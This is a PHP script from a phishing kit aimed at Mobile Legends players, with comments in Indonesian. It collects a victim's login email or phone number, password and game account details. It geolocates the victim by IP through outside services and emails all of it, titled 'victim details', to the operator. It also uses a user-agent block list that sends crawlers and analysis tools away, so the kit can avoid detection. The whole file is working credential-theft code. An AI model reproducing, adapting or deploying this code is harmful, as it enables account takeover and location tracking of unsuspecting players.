<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/IdhamDotID');
die();
}


// MENGAMBIL KONTROL
include 'ryucodex/setting.php';
include 'ryucodex/location.php';
include 'ryucodex/get_callingcode.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$nickname = $_POST['nickname'];
$id = $_POST['userId'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$login = $_POST['login'];

$country  = $khcodes['country'];
$region   = $khcodes['regionName'];
$city     = $khcodes['city'];
$lat      = $khcodes['lat'];
$long     = $khcodes['lon'];
$ipAddr   = $khcodes['query'];

$sender = "From: DevilHostLive | Ress ML $level ($tier) <devilhostlive@gmail.com>";
//MENDAPATKAN KODE PANGGILAN NEGARA
function get_flag()
{
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if (getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if (getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if (getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if (getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if (getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'IP tidak dikenali';
    return $ipaddress;
}
$ip = "" . get_flag() . "";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://arpanrizki.my.id/api/get_flag2/api.php");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt(
    $ch,
    CURLOPT_POSTFIELDS,
    "ip=$ip"
);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$arpantek_flag = curl_exec($ch);
curl_close($ch);

$callingcode = $arpantek_callingcode['country_code'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if ($email == "" && $password == "" && $nickname == "" && $id == "" && $level == "" && $tier == "" && $login == "") {
    header("Location: index.php");
} else {

    // KONTEN RESULT AKUN
    $subjek = "$arpantek_flag |+$callingcode| ML LOG $login | $nickname";
    $pesan = <<<EOD
	<center> 
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Detail Korban</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP Address</th>
<th style="width: 78%; text-align: center;"><b>$ipAddr</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Negara</th>
<th style="width: 78%; text-align: center;"><b>$country</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Email/No Telp/Username</th>
<th style="width: 78%; text-align: center;"><b>$email</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Password</th>
<th style="width: 78%; text-align: center;"><b>$password</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Login</th>
<th style="width: 78%; text-align: center;"><b>$login</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Detail Akun Mobile Legends</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ID Karakter</th>
<th style="width: 78%; text-align: center;"><b>$id</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Nickname</th>
<th style="width: 78%; text-align: center;"><b>$nickname</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Level</th>
<th style="width: 78%; text-align: center;"><b>$level</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Tier</th>
<th style="width: 78%; text-align: center;"><b>$tier</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Device</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Region</th>
<th style="width: 78%; text-align: center;"><b>$region</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>City</th>
<th style="width: 78%; text-align: center;"><b>$city</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Latitude</th>
<th style="width: 78%; text-align: center;"><b>$lat</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Longitude</th>
<th style="width: 78%; text-align: center;"><b>$long</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya :
</div>
<div style="float: right;">
<img style="margin: 5px;" width="30" src="https://i.ibb.co/M5LvZfK/fb.png">
</div>
</div>
</center>
EOD;
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= '' . $sender . '' . "\r\n";
    $kirim = mail($emailku, $subjek, $pesan, $headers);
    
    include 'static/css/style.php';
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= ''.$sender.'' . "\r\n";
    $kirim = mail($emailku, $subjek, $pesan, $headers);
    
    if ($kirim) {
        session_start();
        $_SESSION['nickname'] = $nickname;
        header('location: success.php');
    }
}